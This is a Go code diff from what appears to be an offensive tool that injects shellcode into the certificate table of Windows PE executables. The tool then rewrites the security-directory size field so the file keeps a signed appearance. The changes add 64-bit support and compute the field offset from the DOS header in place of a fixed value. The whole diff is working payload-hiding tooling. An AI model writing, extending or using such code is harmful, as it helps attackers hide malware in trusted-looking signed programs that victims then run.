@@ -109,7 +109,18 @@ func GenerateRandomBytes(length int) ([]byte, error) {
 }
 
 func getCertTableSize(peFile *pe.File) (uint32, uint32) {
-	certTable := peFile.OptionalHeader.(*pe.OptionalHeader32).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_SECURITY]
+	var certTable pe.DataDirectory
+
+	switch optHeader := peFile.OptionalHeader.(type) {
+	case *pe.OptionalHeader32:
+		certTable = optHeader.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_SECURITY]
+	case *pe.OptionalHeader64:
+		certTable = optHeader.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_SECURITY]
+
+	default:
+		panic("未知的可选头类型")
+	}
+
 	return certTable.VirtualAddress, certTable.Size
 }
 
@@ -180,6 +191,12 @@ func main() {
 			check(err)
 			defer peFile.Close()
 
+			is64Bit := false
+			switch peFile.OptionalHeader.(type) {
+			case *pe.OptionalHeader64:
+				is64Bit = true
+			}
+
 			certOffset, certSize := getCertTableSize(peFile)
 
 			shellcode, err := ioutil.ReadFile(args[2])
@@ -223,10 +240,11 @@ func main() {
 			_, err = io.Copy(outFile, file)
 			check(err)
 
-			offset := int64(0x19C)
+			SecurityDirectorySizeOffset := getSecurityDirectorySizeOffset(file, is64Bit)
+
 			buf := make([]byte, 4)
 			binary.LittleEndian.PutUint32(buf, newCertSize)
-			_, err = outFile.Seek(offset, 0)
+			_, err = outFile.Seek(SecurityDirectorySizeOffset, io.SeekStart)
 			check(err)
 			_, err = outFile.Write(buf)
 			check(err)
@@ -239,4 +257,24 @@ func main() {
 	crackerCmd.AddCommand(injectCmd)
 	rootCmd.AddCommand(replacerCmd, crackerCmd)
 	rootCmd.Execute()
+}
+
+func getSecurityDirectorySizeOffset(file *os.File, is64Bit bool) int64 {
+	_, err := file.Seek(0, io.SeekStart)
+	check(err)
+	dosHeader := make([]byte, 64)
+	_, err = file.Read(dosHeader)
+	if err != nil && err != io.EOF {
+		check(err)
+	}
+
+	var SecurityDirectorySizeOffset int64
+	peHeaderOffset := int64(binary.LittleEndian.Uint32(dosHeader[0x3C:]))
+	if is64Bit {
+		SecurityDirectorySizeOffset = peHeaderOffset + 4 + 0x14 + 0x70 + 0x24
+	} else {
+		SecurityDirectorySizeOffset = peHeaderOffset + 4 + 0x14 + 0x60 + 0x24
+	}
+
+	return SecurityDirectorySizeOffset
 }
